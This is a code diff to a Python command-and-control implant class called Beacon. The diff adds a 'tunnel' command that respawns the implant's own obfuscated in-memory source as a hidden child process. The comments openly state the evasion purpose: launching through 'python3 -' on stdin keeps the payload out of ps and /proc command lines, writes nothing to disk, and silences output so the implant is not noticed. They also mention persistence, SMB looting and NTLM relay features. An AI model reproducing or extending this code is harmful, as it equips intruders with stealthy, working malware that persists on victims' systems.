@@ -2511,6 +2511,37 @@ _TUNNEL_JOIN_TIMEOUT = 5.0
 _PROXY_MAX_LINE = 8192
 _PROXY_MAX_HEADERS = 100
 
+# How the beacon tells a child it is the tunnel and not another beacon.
+#
+# An environment variable and not an argument, for two reasons. The child
+# is started as `python3 -` with its source on stdin, so there is no
+# command line left to carry a flag -- which is the whole point of that
+# form, since a quarter of a megabyte of payload in `ps` and
+# `/proc/<pid>/cmdline` is how the tooling this derives from was mapped.
+# And a variable is not in `ps` output at all, where an argument would be.
+#
+# The generated config block reads this name rather than repeating the
+# string: the parent and the child are the same file, and the two ends of
+# an agreement written twice are the two ends that drift.
+_TUNNEL_MODE_ENV = "RACCOON_TUNNEL_MODE"
+
+# How long a terminated tunnel child is given to go before it is killed.
+# A child blocked in an uninterruptible syscall is exactly the pathology
+# running the endpoint in its own process exists to contain, so the wait
+# is bounded and the second signal is not negotiable.
+_TUNNEL_CHILD_STOP_TIMEOUT = 5.0
+
+# How long the child is given to read the source off its stdin. The
+# interpreter drains stdin to EOF before it compiles a line, so a few
+# hundred kilobytes is milliseconds and this bound is never reached on
+# the real path. It exists because the pipe buffer is around 64 KB and a
+# child that reads nothing -- `sys.executable` pointing at an embedded
+# interpreter or a frozen host application rather than at python -- would
+# otherwise block the beacon's own thread for ever in the write. The
+# beacon is the access and the tunnel is the convenience; the convenience
+# does not get to hang the access.
+_TUNNEL_SOURCE_TIMEOUT = 30.0
+
 # Which RFC 1928 reply code each failure to reach a target becomes.
 # Explicit, because an operator's tool prints this code directly and a
 # wrong one sends somebody debugging the wrong layer: `0x05` has them
@@ -3821,6 +3852,17 @@ class Beacon:
         self._registered = False
         self._consecutive_failures = 0
 
+        # The tunnel endpoint runs in its own process, not a thread: the
+        # beacon is the access and the tunnel is the convenience, so a
+        # hung or crashed tunnel must not be able to take the beacon with
+        # it. One child at a time, and the record outlives the child so a
+        # check-in can confirm a stop and report a crash.
+        self._tunnel_proc: Optional[subprocess.Popen] = None
+        self._tunnel_origin = ""
+        # `_exec_tunnel` runs on the beacon thread and `stop` on whichever
+        # thread owns the process, so the two meet over this.
+        self._tunnel_lock = threading.Lock()
+
         # A launcher that runs on the drop-box says so; the Raccoon config on
         # disk is the independent second signal (see _probe_dropbox).
         self._dropbox_hint = bool(c2.get("dropbox", False))
@@ -4093,6 +4135,15 @@ class Beacon:
             info["proxy_active"] = self._proxy._active_proxy["url"]
         elif self._proxy_session and self._proxy_session.proxies:
             info["proxy_active"] = next(iter(self._proxy_session.proxies.values()), "none")
+
+        # Only when this beacon has started a tunnel child, so the check-in
+        # payload of every build that has no tunnel is byte for byte what
+        # it was. A child that has died is reported rather than forgotten:
+        # that is the only signal an operator gets for a tunnel that
+        # crashed, and it is what confirms a stop they asked for.
+        tunnel = self._tunnel_status()
+        if tunnel is not None:
+            info["tunnel"] = tunnel
 
         if self._c2_profile:
             p = self._c2_profile
@@ -5639,6 +5690,230 @@ class Beacon:
             i += 4
         return shares
 
+    # ── The tunnel child ──
+
+    def _tunnel_source(self) -> Tuple[bytes, str]:
+        """The source to hand a child, and where it was taken from.
+
+        A generated artifact carries its own source in the module global
+        `_src`, bound by each obfuscation layer as it decompresses the
+        next (`_obfuscate_layer` in server.py). That global is the only
+        copy there is: what this project ships is
+        `python3 -c '<blob>'`, where there is no file to re-run and
+        `sys.argv[0]` is the literal string "-c" -- which is also why
+        `_get_beacon_path` answers with something useless in exactly the
+        mode this runs in.
+
+        No `_src` means this file was run straight from a checkout rather
+        than built into an artifact, and then `__file__` is the source. A
+        developer in that position should not be debugging a missing
+        global, so it is a supported path and not an error.
+
+        The second return value says which it was, and `_exec_tunnel`
+        puts it in what it reports: "the tunnel is running a different
+        build from the beacon" is otherwise invisible, and it is the first
+        thing to suspect when a child connects and then behaves like
+        another version.
+        """
+        src = globals().get("_src")
+        if isinstance(src, str):
+            # A layer that bound text rather than bytes. Accepted because
+            # the alternative is refusing to start over an encoding.
+            src = src.encode("utf-8")
+        if isinstance(src, bytes) and src:
+            return src, "_src, this artifact's own source (%d bytes)" % len(src)
+        path = globals().get("__file__")
+        if not path:
+            raise RuntimeError(
+                "this process has neither the module global _src nor a "
+                "__file__, so there is no copy of the source to give a "
+                "child. A generated artifact has _src; a checkout has a "
+                "file.")
+        path = os.path.abspath(path)
+        data = Path(path).read_bytes()
+        return data, ("%s (no _src: this is a checkout and not a generated "
+                      "artifact, %d bytes)" % (path, len(data)))
+
+    def _tunnel_status(self) -> Optional[dict]:
+        """What this beacon's tunnel child is doing, or None if it had none.
+
+        `poll` is what reaps a child that has exited, so asking this on
+        every check-in is also what keeps a dead one from staying a
+        zombie.
+        """
+        with self._tunnel_lock:
+            proc = self._tunnel_proc
+            if proc is None:
+                return None
+            code = proc.poll()
+            row = {
+                "pid": proc.pid,
+                "running": code is None,
+                "source": self._tunnel_origin,
+            }
+            if code is not None:
+                row["exit_code"] = code
+            return row
+
+    def _exec_tunnel(self, action: str) -> str:
+        """Start or stop the tunnel endpoint as a child of this process."""
+        action = (action or "").strip().lower()
+        if action == "start":
+            return self._tunnel_start()
+        if action == "stop":
+            return self._tunnel_stop()
+        return ("[error] Unknown tunnel action %r: it is 'tunnel start' or "
+                "'tunnel stop'" % action)
+
+    def _tunnel_start(self) -> str:
+        """Run this artifact again as `python3 -`, in tunnel mode.
+
+        Four ways to start a second process of the same code exist and
+        three are worse. Re-running `python3 -c '<blob>'` writes the whole
+        payload into `ps` and `/proc/<pid>/cmdline`, which is how the
+        infrastructure this derives from was mapped across providers.
+        Writing the source to a file throws away the in-memory property
+        the one-liner exists for. `fork` does not exist on Windows, where
+        much of this design lives. `python3 -` with the source on stdin is
+        an unremarkable command line, leaves nothing on disk, and is the
+        same mechanism on both platforms.
+        """
+        with self._tunnel_lock:
+            proc = self._tunnel_proc
+            if proc is not None and proc.poll() is None:
+                return ("Tunnel already running: pid %d (one child per "
+                        "beacon; stop it before starting another)"
+                        % proc.pid)
+            try:
+                source, origin = self._tunnel_source()
+            except (OSError, RuntimeError) as exc:
+                return "[error] No source to give a tunnel child: %s" % exc
+
+            env = dict(os.environ)
+            env[_TUNNEL_MODE_ENV] = "1"
+            try:
+                child = subprocess.Popen(
+                    [sys.executable, "-"],
+                    stdin=subprocess.PIPE,
+                    # Both ends closed: a child that writes to the
+                    # terminal it was started from is how an implant is
+                    # noticed. What the endpoint could not do is reported
+                    # through its exit code at the next check-in, and the
+                    # tunnel server's own log is the other half.
+                    stdout=subprocess.DEVNULL,
+                    stderr=subprocess.DEVNULL,
+                    env=env,
+                    close_fds=True,
+                )
+            except OSError as exc:
+                return ("[error] Could not start %s: %s"
+                        % (sys.executable, exc))
+
+            try:
+                # On a thread with a bounded join, not inline. `python -`
+                # reads stdin to EOF before it compiles anything, so this
+                # is milliseconds -- but the pipe holds only about 64 KB,
+                # and a child that reads nothing at all would park the
+                # beacon's own thread in `write` for ever. See
+                # `_TUNNEL_SOURCE_TIMEOUT`.
+                failure = self._feed_tunnel_child(child, source)
+            except RuntimeError as exc:
+                # The host is out of threads, which is the one way the
+                # feed can fail before it has begun. A child left running
+                # with no record of it is a process nothing can stop, so
+                # it goes the same way as one that read nothing.
+                failure = "its source could not be written: %s" % exc
+            if failure is not None:
+                child.kill()
+                child.wait(timeout=_TUNNEL_CHILD_STOP_TIMEOUT)
+                return ("[error] The tunnel child was given no source and "
+                        "has been killed: %s (exit %s)"
+                        % (failure, child.returncode))
+
+            self._tunnel_proc = child
+            self._tunnel_origin = origin
+            logger.info("Tunnel child started: pid %d, source from %s",
+                        child.pid, origin)
+            return ("Tunnel started: pid %d, %s - with the source on "
+                    "stdin, so none of it is on a command line. Source: %s"
+                    % (child.pid, sys.executable, origin))
+
+    @staticmethod
+    def _feed_tunnel_child(child, source: bytes) -> Optional[str]:
+        """Write the source to the child's stdin. Why it failed, or None.
+
+        The write is on a thread so the wait on it can be bounded: a
+        child that is not reading stdin would otherwise hold the caller
+        in `write` as soon as the pipe filled, and the caller is the
+        beacon's own loop.
+
+        Killing the child is left to the caller, and it is what ends this
+        thread when the bound is reached -- the parked `write` fails with
+        EPIPE the moment the reader is gone, so the thread is not leaked.
+        """
+        trouble = []
+
+        def feed():
+            try:
+                child.stdin.write(source)
+            except OSError as exc:
+                # A child that exited before it read -- a broken pipe --
+                # or a stdin already closed under us.
+                trouble.append("%s: %s" % (type(exc).__name__, exc))
+            finally:
+                try:
+                    # Closed on every path, including the one the caller
+                    # unparks by killing the child: a pipe left open is a
+                    # descriptor leak in a process meant to run for
+                    # months, and the EOF is what tells the interpreter
+                    # the script is complete.
+                    child.stdin.close()
+                except OSError:
+                    # The flush that `close` does finds the same broken
+                    # pipe the write did. The descriptor is closed either
+                    # way, which is what this is for.
+                    pass
+
+        writer = threading.Thread(target=feed, name="tunnel-feed",
+                                  daemon=True)
+        writer.start()
+        writer.join(_TUNNEL_SOURCE_TIMEOUT)
+        if writer.is_alive():
+            return ("it read none of the %d bytes on its stdin within "
+                    "%.0fs, so it is not an interpreter reading a script"
+                    % (len(source), _TUNNEL_SOURCE_TIMEOUT))
+        return trouble[0] if trouble else None
+
+    def _tunnel_stop(self) -> str:
+        """Stop the tunnel child. The record of it outlives it.
+
+        Not cleared, because an operator's stop is pending until a
+        check-in confirms it: a beacon that forgot the child would report
+        nothing, which is indistinguishable from a stop that never
+        happened.
+        """
+        with self._tunnel_lock:
+            proc = self._tunnel_proc
+            if proc is None:
+                return ("No tunnel child is running: this beacon has not "
+                        "started one")
+            code = proc.poll()
+            if code is not None:
+                return ("No tunnel child is running: pid %d had already "
+                        "exited with %s" % (proc.pid, code))
+            proc.terminate()
+            try:
+                code = proc.wait(timeout=_TUNNEL_CHILD_STOP_TIMEOUT)
+            except subprocess.TimeoutExpired:
+                proc.kill()
+                code = proc.wait(timeout=_TUNNEL_CHILD_STOP_TIMEOUT)
+                logger.warning("Tunnel child pid %d ignored a terminate and "
+                               "was killed", proc.pid)
+                return ("Tunnel stopped: pid %d ignored a terminate and was "
+                        "killed (exit %s)" % (proc.pid, code))
+            logger.info("Tunnel child stopped: pid %d, exit %s", proc.pid, code)
+            return "Tunnel stopped: pid %d, exit %s" % (proc.pid, code)
+
     # ── Persistence ──
 
     def _get_beacon_path(self) -> str:
@@ -6650,6 +6925,9 @@ class Beacon:
             elif cmd == "smbloot":
                 output = self._exec_smbloot(args)
 
+            elif cmd == "tunnel":
+                output = self._exec_tunnel(args)
+
             else:
                 status = "error"
                 output = f"Unknown command: {cmd}"
@@ -6850,4 +7128,11 @@ class Beacon:
         if self._ntlm_relay:
             self._ntlm_relay.stop()
             self._ntlm_relay = None
+        # The beacon is the only way to task the tunnel, so a tunnel that
+        # outlived it would be a process nothing could reach and nothing
+        # could stop. The record is left in place: see `_tunnel_stop`.
+        if self._tunnel_proc is not None and self._tunnel_proc.poll() is None:
+            logger.info("Beacon stopping: taking tunnel child pid %d with it",
+                        self._tunnel_proc.pid)
+            self._tunnel_stop()
         logger.info("Beacon stopped")
